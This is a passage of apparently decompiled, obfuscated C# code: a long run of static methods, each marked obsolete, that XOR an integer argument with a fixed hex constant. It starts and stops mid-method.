		return int_4 ^ 0x692C6236;
	}

	[Obsolete("Exclude")]
	public static int smethod_6010(int int_4)
	{
		return int_4 ^ 0x686AC35E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6011(int int_4)
	{
		return int_4 ^ 0x45045E20;
	}

	[Obsolete("Exclude")]
	public static int smethod_6012(int int_4)
	{
		return int_4 ^ 0x543E8F21;
	}

	[Obsolete("Exclude")]
	public static int smethod_6013(int int_4)
	{
		return int_4 ^ 0x4C1C989E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6014(int int_4)
	{
		return int_4 ^ 0x6B325123;
	}

	[Obsolete("Exclude")]
	public static int smethod_6016(int int_4)
	{
		return int_4 ^ 0x592F720E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6017(int int_4)
	{
		return int_4 ^ 0x3F2D9852;
	}

	[Obsolete("Exclude")]
	public static int smethod_6018(int int_4)
	{
		return int_4 ^ 0xB96340E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6019(int int_4)
	{
		return int_4 ^ 0x1CB9F111;
	}

	[Obsolete("Exclude")]
	public static int smethod_6020(int int_4)
	{
		return int_4 ^ 0x78DE2E88;
	}

	[Obsolete("Exclude")]
	public static int smethod_6021(int int_4)
	{
		return int_4 ^ 0x3ACBE28A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6022(int int_4)
	{
		return int_4 ^ 0x3F0D7D37;
	}

	[Obsolete("Exclude")]
	public static int smethod_6023(int int_4)
	{
		return int_4 ^ 0x2CF93C90;
	}

	[Obsolete("Exclude")]
	public static int smethod_6024(int int_4)
	{
		return int_4 ^ 0x2DCD4867;
	}

	[Obsolete("Exclude")]
	public static int smethod_6025(int int_4)
	{
		return int_4 ^ 0x7ACADBF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6026(int int_4)
	{
		return int_4 ^ 0x25A08CF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6027(int int_4)
	{
		return int_4 ^ 0x2DA0EF93;
	}

	[Obsolete("Exclude")]
	public static int smethod_6029(int int_4)
	{
		return int_4 ^ 0x1D859EEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6030(int int_4)
	{
		return int_4 ^ 0x6D0523F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6031(int int_4)
	{
		return int_4 ^ 0x5BCD02A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6032(int int_4)
	{
		return int_4 ^ 0x64D6D405;
	}

	[Obsolete("Exclude")]
	public static int smethod_6033(int int_4)
	{
		return int_4 ^ 0x78420C7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6034(int int_4)
	{
		return int_4 ^ 0x1EFFEBBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6035(int int_4)
	{
		return int_4 ^ 0x39730943;
	}

	[Obsolete("Exclude")]
	public static int smethod_6036(int int_4)
	{
		return int_4 ^ 0x3D79B86E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6037(int int_4)
	{
		return int_4 ^ 0x18CB8B49;
	}

	[Obsolete("Exclude")]
	public static int smethod_6038(int int_4)
	{
		return int_4 ^ 0x1BC24C41;
	}

	[Obsolete("Exclude")]
	public static int smethod_6039(int int_4)
	{
		return int_4 ^ 0x2F1BCB33;
	}

	[Obsolete("Exclude")]
	public static int smethod_6040(int int_4)
	{
		return int_4 ^ 0xB68DB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6041(int int_4)
	{
		return int_4 ^ 0x6584DCE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6042(int int_4)
	{
		return int_4 ^ 0xE7A183F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6043(int int_4)
	{
		return int_4 ^ 0x363412A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6044(int int_4)
	{
		return int_4 ^ 0x7F213670;
	}

	[Obsolete("Exclude")]
	public static int smethod_6045(int int_4)
	{
		return int_4 ^ 0x6966494D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6046(int int_4)
	{
		return int_4 ^ 0x6F542163;
	}

	[Obsolete("Exclude")]
	public static int smethod_6047(int int_4)
	{
		return int_4 ^ 0x7D0195DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6048(int int_4)
	{
		return int_4 ^ 0x72F094FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6050(int int_4)
	{
		return int_4 ^ 0x494B810E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6051(int int_4)
	{
		return int_4 ^ 0x7BC9EEBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6052(int int_4)
	{
		return int_4 ^ 0x61AC2DD6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6053(int int_4)
	{
		return int_4 ^ 0x5A6F22FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6054(int int_4)
	{
		return int_4 ^ 0xF277A45;
	}

	[Obsolete("Exclude")]
	public static int smethod_6055(int int_4)
	{
		return int_4 ^ 0x5F560002;
	}

	[Obsolete("Exclude")]
	public static int smethod_6056(int int_4)
	{
		return int_4 ^ 0x763F0CAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6057(int int_4)
	{
		return int_4 ^ 0x25C77FC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6059(int int_4)
	{
		return int_4 ^ 0x5890F46D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6060(int int_4)
	{
		return int_4 ^ 0x4F2A8412;
	}

	[Obsolete("Exclude")]
	public static int smethod_6061(int int_4)
	{
		return int_4 ^ 0x307FC25E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6062(int int_4)
	{
		return int_4 ^ 0x28083445;
	}

	[Obsolete("Exclude")]
	public static int smethod_6063(int int_4)
	{
		return int_4 ^ 0x114027FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6064(int int_4)
	{
		return int_4 ^ 0x19A20D00;
	}

	[Obsolete("Exclude")]
	public static int smethod_6065(int int_4)
	{
		return int_4 ^ 0x44B470EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6066(int int_4)
	{
		return int_4 ^ 0x8073F36;
	}

	[Obsolete("Exclude")]
	public static int smethod_6067(int int_4)
	{
		return int_4 ^ 0x626F6900;
	}

	[Obsolete("Exclude")]
	public static int smethod_6068(int int_4)
	{
		return int_4 ^ 0x23346F34;
	}

	[Obsolete("Exclude")]
	public static int smethod_6069(int int_4)
	{
		return int_4 ^ 0x1A0DA1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6070(int int_4)
	{
		return int_4 ^ 0xBBCFD83;
	}

	[Obsolete("Exclude")]
	public static int smethod_6071(int int_4)
	{
		return int_4 ^ 0x3E8B3E3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6072(int int_4)
	{
		return int_4 ^ 0x4326C5F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6074(int int_4)
	{
		return int_4 ^ 0x23BDB4F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6075(int int_4)
	{
		return int_4 ^ 0x323F4D79;
	}

	[Obsolete("Exclude")]
	public static int smethod_6076(int int_4)
	{
		return int_4 ^ 0x5479402D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6077(int int_4)
	{
		return int_4 ^ 0x3E7F0897;
	}

	[Obsolete("Exclude")]
	public static int smethod_6079(int int_4)
	{
		return int_4 ^ 0x4387B735;
	}

	[Obsolete("Exclude")]
	public static int smethod_6080(int int_4)
	{
		return int_4 ^ 0x79B55D6B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6081(int int_4)
	{
		return int_4 ^ 0x29DCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6082(int int_4)
	{
		return int_4 ^ 0x2A19DEF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6083(int int_4)
	{
		return int_4 ^ 0x57674366;
	}

	[Obsolete("Exclude")]
	public static int smethod_6084(int int_4)
	{
		return int_4 ^ 0x366DCD75;
	}

	[Obsolete("Exclude")]
	public static int smethod_6086(int int_4)
	{
		return int_4 ^ 0x141BC2FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6087(int int_4)
	{
		return int_4 ^ 0x49452603;
	}

	[Obsolete("Exclude")]
	public static int smethod_6088(int int_4)
	{
		return int_4 ^ 0x4FF7BB92;
	}

	[Obsolete("Exclude")]
	public static int smethod_6089(int int_4)
	{
		return int_4 ^ 0x57945DE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6090(int int_4)
	{
		return int_4 ^ 0x5A1F81AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6091(int int_4)
	{
		return int_4 ^ 0x5F1907B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6092(int int_4)
	{
		return int_4 ^ 0x5015D5F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6093(int int_4)
	{
		return int_4 ^ 0x64F879C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6094(int int_4)
	{
		return int_4 ^ 0x5B1A80FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6095(int int_4)
	{
		return int_4 ^ 0x214AE7E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6096(int int_4)
	{
		return int_4 ^ 0x74E3717E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6097(int int_4)
	{
		return int_4 ^ 0x476A055F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6098(int int_4)
	{
		return int_4 ^ 0xDE12296;
	}

	[Obsolete("Exclude")]
	public static int smethod_6099(int int_4)
	{
		return int_4 ^ 0x43D432A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6100(int int_4)
	{
		return int_4 ^ 0x3E505268;
	}

	[Obsolete("Exclude")]
	public static int smethod_6101(int int_4)
	{
		return int_4 ^ 0x70CDF6D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6102(int int_4)
	{
		return int_4 ^ 0x4A3CE7A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6103(int int_4)
	{
		return int_4 ^ 0x1A0F9A9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6104(int int_4)
	{
		return int_4 ^ 0x3D18355D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6105(int int_4)
	{
		return int_4 ^ 0x4618D1C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6106(int int_4)
	{
		return int_4 ^ 0x6AEFF936;
	}

	[Obsolete("Exclude")]
	public static int smethod_6107(int int_4)
	{
		return int_4 ^ 0x1E5E3A40;
	}

	[Obsolete("Exclude")]
	public static int smethod_6108(int int_4)
	{
		return int_4 ^ 0x42C2341C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6109(int int_4)
	{
		return int_4 ^ 0x39E330B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6110(int int_4)
	{
		return int_4 ^ 0x23F6B1F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6111(int int_4)
	{
		return int_4 ^ 0x6892FE88;
	}

	[Obsolete("Exclude")]
	public static int smethod_6113(int int_4)
	{
		return int_4 ^ 0x79113B3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6114(int int_4)
	{
		return int_4 ^ 0x26B1DD36;
	}

	[Obsolete("Exclude")]
	public static int smethod_6115(int int_4)
	{
		return int_4 ^ 0x2C03C301;
	}

	[Obsolete("Exclude")]
	public static int smethod_6116(int int_4)
	{
		return int_4 ^ 0x31702DD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6117(int int_4)
	{
		return int_4 ^ 0x2A4FFD7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6118(int int_4)
	{
		return int_4 ^ 0x6A09BA65;
	}

	[Obsolete("Exclude")]
	public static int smethod_6119(int int_4)
	{
		return int_4 ^ 0x7DBE8EBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6120(int int_4)
	{
		return int_4 ^ 0x609A011D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6121(int int_4)
	{
		return int_4 ^ 0x2BE49F7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6122(int int_4)
	{
		return int_4 ^ 0x324463D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6123(int int_4)
	{
		return int_4 ^ 0x34A926DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6124(int int_4)
	{
		return int_4 ^ 0x2C81D10;
	}

	[Obsolete("Exclude")]
	public static int smethod_6125(int int_4)
	{
		return int_4 ^ 0x1B93606B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6127(int int_4)
	{
		return int_4 ^ 0x4B860047;
	}

	[Obsolete("Exclude")]
	public static int smethod_6128(int int_4)
	{
		return int_4 ^ 0x3E823E4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6129(int int_4)
	{
		return int_4 ^ 0x9EE098C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6130(int int_4)
	{
		return int_4 ^ 0x2B4D1B34;
	}

	[Obsolete("Exclude")]
	public static int smethod_6131(int int_4)
	{
		return int_4 ^ 0x794B039D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6132(int int_4)
	{
		return int_4 ^ 0x210F26BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6133(int int_4)
	{
		return int_4 ^ 0x6EE8966A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6134(int int_4)
	{
		return int_4 ^ 0x417836AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6135(int int_4)
	{
		return int_4 ^ 0xF704E3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6136(int int_4)
	{
		return int_4 ^ 0x442DACB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6137(int int_4)
	{
		return int_4 ^ 0x76FE1493;
	}

	[Obsolete("Exclude")]
	public static int smethod_6138(int int_4)
	{
		return int_4 ^ 0x318C6FD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6140(int int_4)
	{
		return int_4 ^ 0x6D5607FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6141(int int_4)
	{
		return int_4 ^ 0x14A887B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6142(int int_4)
	{
		return int_4 ^ 0x281418F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6143(int int_4)
	{
		return int_4 ^ 0x244290B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6144(int int_4)
	{
		return int_4 ^ 0x5A4EE2AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6145(int int_4)
	{
		return int_4 ^ 0x4C6CE0DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6146(int int_4)
	{
		return int_4 ^ 0x6218126A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6147(int int_4)
	{
		return int_4 ^ 0xE31B54F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6148(int int_4)
	{
		return int_4 ^ 0xBD92F32;
	}

	[Obsolete("Exclude")]
	public static int smethod_6149(int int_4)
	{
		return int_4 ^ 0x15476021;
	}

	[Obsolete("Exclude")]
	public static int smethod_6150(int int_4)
	{
		return int_4 ^ 0x7FE68961;
	}

	[Obsolete("Exclude")]
	public static int smethod_6151(int int_4)
	{
		return int_4 ^ 0x56B8C2AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6152(int int_4)
	{
		return int_4 ^ 0x543910EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6153(int int_4)
	{
		return int_4 ^ 0x77F90E9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6154(int int_4)
	{
		return int_4 ^ 0x54A94753;
	}

	[Obsolete("Exclude")]
	public static int smethod_6155(int int_4)
	{
		return int_4 ^ 0xB12FD2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6156(int int_4)
	{
		return int_4 ^ 0x14A77A52;
	}

	[Obsolete("Exclude")]
	public static int smethod_6157(int int_4)
	{
		return int_4 ^ 0x66165816;
	}

	[Obsolete("Exclude")]
	public static int smethod_6158(int int_4)
	{
		return int_4 ^ 0x117100A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6159(int int_4)
	{
		return int_4 ^ 0x505706D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6160(int int_4)
	{
		return int_4 ^ 0x24ABDD0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6161(int int_4)
	{
		return int_4 ^ 0x5531E1AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6162(int int_4)
	{
		return int_4 ^ 0x53B90DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6163(int int_4)
	{
		return int_4 ^ 0x2DDA9609;
	}

	[Obsolete("Exclude")]
	public static int smethod_6164(int int_4)
	{
		return int_4 ^ 0x722E956D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6165(int int_4)
	{
		return int_4 ^ 0xE938666;
	}

	[Obsolete("Exclude")]
	public static int smethod_6166(int int_4)
	{
		return int_4 ^ 0x60BF5E5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6167(int int_4)
	{
		return int_4 ^ 0x4E8563C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6168(int int_4)
	{
		return int_4 ^ 0x2BC7E80B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6169(int int_4)
	{
		return int_4 ^ 0x5ECFE0EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6170(int int_4)
	{
		return int_4 ^ 0x3C007B41;
	}

	[Obsolete("Exclude")]
	public static int smethod_6171(int int_4)
	{
		return int_4 ^ 0xDFA1E2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6172(int int_4)
	{
		return int_4 ^ 0x667D11ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_6174(int int_4)
	{
		return int_4 ^ 0x4D436D8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6175(int int_4)
	{
		return int_4 ^ 0x2F64CB21;
	}

	[Obsolete("Exclude")]
	public static int smethod_6176(int int_4)
	{
		return int_4 ^ 0x63D5C702;
	}

	[Obsolete("Exclude")]
	public static int smethod_6177(int int_4)
	{
		return int_4 ^ 0x1F719B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6178(int int_4)
	{
		return int_4 ^ 0x6CA15D2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6179(int int_4)
	{
		return int_4 ^ 0x362F873;
	}

	[Obsolete("Exclude")]
	public static int smethod_6180(int int_4)
	{
		return int_4 ^ 0x53F17E4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6181(int int_4)
	{
		return int_4 ^ 0x49C05A9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6182(int int_4)
	{
		return int_4 ^ 0x4CB68AAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6183(int int_4)
	{
		return int_4 ^ 0x5373BF42;
	}

	[Obsolete("Exclude")]
	public static int smethod_6184(int int_4)
	{
		return int_4 ^ 0x25E4449B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6185(int int_4)
	{
		return int_4 ^ 0x626ECED;
	}

	[Obsolete("Exclude")]
	public static int smethod_6186(int int_4)
	{
		return int_4 ^ 0x3013FD08;
	}

	[Obsolete("Exclude")]
	public static int smethod_6187(int int_4)
	{
		return int_4 ^ 0x5D574C27;
	}

	[Obsolete("Exclude")]
	public static int smethod_6188(int int_4)
	{
		return int_4 ^ 0x2E7E0DC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6189(int int_4)
	{
		return int_4 ^ 0x512847AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6190(int int_4)
	{
		return int_4 ^ 0x5A9C8B5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6191(int int_4)
	{
		return int_4 ^ 0x35BC6614;
	}

	[Obsolete("Exclude")]
	public static int smethod_6193(int int_4)
	{
		return int_4 ^ 0x1567401;
	}

	[Obsolete("Exclude")]
	public static int smethod_6194(int int_4)
	{
		return int_4 ^ 0x2EAA74AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6195(int int_4)
	{
		return int_4 ^ 0x7F2BD65F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6196(int int_4)
	{
		return int_4 ^ 0x6A61E84F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6197(int int_4)
	{
		return int_4 ^ 0x3816FA9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6198(int int_4)
	{
		return int_4 ^ 0x7EE8C33F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6199(int int_4)
	{
		return int_4 ^ 0x7333C0B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6200(int int_4)
	{
		return int_4 ^ 0x463A5A7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6201(int int_4)
	{
		return int_4 ^ 0x4FD0BA05;
	}

	[Obsolete("Exclude")]
	public static int smethod_6202(int int_4)
	{
		return int_4 ^ 0x38B9DED5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6203(int int_4)
	{
		return int_4 ^ 0x29FC38B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6204(int int_4)
	{
		return int_4 ^ 0x11949A03;
	}

	[Obsolete("Exclude")]
	public static int smethod_6205(int int_4)
	{
		return int_4 ^ 0x4093F95D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6206(int int_4)
	{
		return int_4 ^ 0x36A87410;
	}

	[Obsolete("Exclude")]
	public static int smethod_6207(int int_4)
	{
		return int_4 ^ 0x7EB9859B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6208(int int_4)
	{
		return int_4 ^ 0x1489AB26;
	}

	[Obsolete("Exclude")]
	public static int smethod_6209(int int_4)
	{
		return int_4 ^ 0x13237AB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6210(int int_4)
	{
		return int_4 ^ 0x582DC36B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6211(int int_4)
	{
		return int_4 ^ 0x453B5B6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6212(int int_4)
	{
		return int_4 ^ 0x7961CB5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6213(int int_4)
	{
		return int_4 ^ 0x1693B360;
	}

	[Obsolete("Exclude")]
	public static int smethod_6214(int int_4)
	{
		return int_4 ^ 0x7E89FD2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6215(int int_4)
	{
		return int_4 ^ 0x217E341B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6216(int int_4)
	{
		return int_4 ^ 0x7D4AC020;
	}

	[Obsolete("Exclude")]
	public static int smethod_6217(int int_4)
	{
		return int_4 ^ 0x5B653B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6219(int int_4)
	{
		return int_4 ^ 0x787BE93F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6220(int int_4)
	{
		return int_4 ^ 0x33878407;
	}

	[Obsolete("Exclude")]
	public static int smethod_6221(int int_4)
	{
		return int_4 ^ 0x9841BA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6222(int int_4)
	{
		return int_4 ^ 0x69822E39;
	}

	[Obsolete("Exclude")]
	public static int smethod_6223(int int_4)
	{
		return int_4 ^ 0x1B5B88A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6224(int int_4)
	{
		return int_4 ^ 0x1CAAFDE4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6225(int int_4)
	{
		return int_4 ^ 0x61C026C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6226(int int_4)
	{
		return int_4 ^ 0x74FC001E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6227(int int_4)
	{
		return int_4 ^ 0xDAB201F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6228(int int_4)
	{
		return int_4 ^ 0x5CCD05A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6229(int int_4)
	{
		return int_4 ^ 0x7569CBDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6230(int int_4)
	{
		return int_4 ^ 0x3674C598;
	}

	[Obsolete("Exclude")]
	public static int smethod_6232(int int_4)
	{
		return int_4 ^ 0x3C70A3D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6233(int int_4)
	{
		return int_4 ^ 0x18915C1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6234(int int_4)
	{
		return int_4 ^ 0x5E65698C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6235(int int_4)
	{
		return int_4 ^ 0x59976BDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6236(int int_4)
	{
		return int_4 ^ 0x3089C639;
	}

	[Obsolete("Exclude")]
	public static int smethod_6237(int int_4)
	{
		return int_4 ^ 0x53F2520E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6238(int int_4)
	{
		return int_4 ^ 0x788E6FFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6239(int int_4)
	{
		return int_4 ^ 0x7530A495;
	}

	[Obsolete("Exclude")]
	public static int smethod_6240(int int_4)
	{
		return int_4 ^ 0x707E512A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6241(int int_4)
	{
		return int_4 ^ 0x61FC8C9B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6244(int int_4)
	{
		return int_4 ^ 0x755DCAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6245(int int_4)
	{
		return int_4 ^ 0x3A759B16;
	}

	[Obsolete("Exclude")]
	public static int smethod_6246(int int_4)
	{
		return int_4 ^ 0x6494EC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6247(int int_4)
	{
		return int_4 ^ 0x6F450306;
	}

	[Obsolete("Exclude")]
	public static int smethod_6248(int int_4)
	{
		return int_4 ^ 0x669CDC46;
	}

	[Obsolete("Exclude")]
	public static int smethod_6249(int int_4)
	{
		return int_4 ^ 0x20BE5FC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6250(int int_4)
	{
		return int_4 ^ 0x1EF8DA42;
	}

	[Obsolete("Exclude")]
	public static int smethod_6252(int int_4)
	{
		return int_4 ^ 0x10C98D74;
	}

	[Obsolete("Exclude")]
	public static int smethod_6253(int int_4)
	{
		return int_4 ^ 0x50B5E21C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6254(int int_4)
	{
		return int_4 ^ 0x574CE2C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6255(int int_4)
	{
		return int_4 ^ 0x542E7DB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6256(int int_4)
	{
		return int_4 ^ 0xD8F5AE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6257(int int_4)
	{
		return int_4 ^ 0x3DA1D31;
	}

	[Obsolete("Exclude")]
	public static int smethod_6259(int int_4)
	{
		return int_4 ^ 0x34AB3BD6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6260(int int_4)
	{
		return int_4 ^ 0x303D430D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6261(int int_4)
	{
		return int_4 ^ 0x72716EB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6262(int int_4)
	{
		return int_4 ^ 0x33470E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6263(int int_4)
	{
		return int_4 ^ 0x6820A530;
	}

	[Obsolete("Exclude")]
	public static int smethod_6264(int int_4)
	{
		return int_4 ^ 0x6FB70370;
	}

	[Obsolete("Exclude")]
	public static int smethod_6265(int int_4)
	{
		return int_4 ^ 0x1EB2431F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6266(int int_4)
	{
		return int_4 ^ 0x7A3F2E28;
	}

	[Obsolete("Exclude")]
	public static int smethod_6267(int int_4)
	{
		return int_4 ^ 0x34781F41;
	}

	[Obsolete("Exclude")]
	public static int smethod_6268(int int_4)
	{
		return int_4 ^ 0x326F6EED;
	}

	[Obsolete("Exclude")]
	public static int smethod_6269(int int_4)
	{
		return int_4 ^ 0x561E45DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6270(int int_4)
	{
		return int_4 ^ 0x51411F9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6271(int int_4)
	{
		return int_4 ^ 0x10074EF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6272(int int_4)
	{
		return int_4 ^ 0x4A87D374;
	}

	[Obsolete("Exclude")]
	public static int smethod_6273(int int_4)
	{
		return int_4 ^ 0x54D3FB50;
	}

	[Obsolete("Exclude")]
	public static int smethod_6274(int int_4)
	{
		return int_4 ^ 0x182341F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6275(int int_4)
	{
		return int_4 ^ 0x604251F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6276(int int_4)
	{
		return int_4 ^ 0x5C8BD4EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6277(int int_4)
	{
		return int_4 ^ 0x3E4B71A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6279(int int_4)
	{
		return int_4 ^ 0x7AAC95E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6281(int int_4)
	{
		return int_4 ^ 0x67C8A3CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6282(int int_4)
	{
		return int_4 ^ 0x4688D5D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6283(int int_4)
	{
		return int_4 ^ 0x76D924A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6284(int int_4)
	{
		return int_4 ^ 0x762040CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6285(int int_4)
	{
		return int_4 ^ 0x706DCEE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6286(int int_4)
	{
		return int_4 ^ 0x62127028;
	}

	[Obsolete("Exclude")]
	public static int smethod_6287(int int_4)
	{
		return int_4 ^ 0x152686CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6288(int int_4)
	{
		return int_4 ^ 0x68343C37;
	}

	[Obsolete("Exclude")]
	public static int smethod_6289(int int_4)
	{
		return int_4 ^ 0x1924897E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6290(int int_4)
	{
